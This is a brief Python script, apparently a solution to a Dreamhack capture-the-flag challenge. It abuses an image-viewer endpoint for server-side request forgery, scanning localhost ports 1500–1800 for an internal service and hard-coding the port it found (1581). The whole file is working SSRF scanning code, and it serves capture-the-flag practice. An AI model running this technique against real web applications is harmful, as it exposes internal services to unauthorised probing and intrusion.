import requests
import time
from tqdm import tqdm

url ='http://host3.dreamhack.games:16366/img_viewer'
params = {'url': ''}

def find_port():
    for i in tqdm(range(1500, 1801)):
        params['url'] = 'http://Localhost:' + str(i)
        data = requests.post(url, data=params)
        if 'iVBORw0KG' not in data.text:
            print('Found: ' + str(i))
            return i
        time.sleep(1)

port = 1581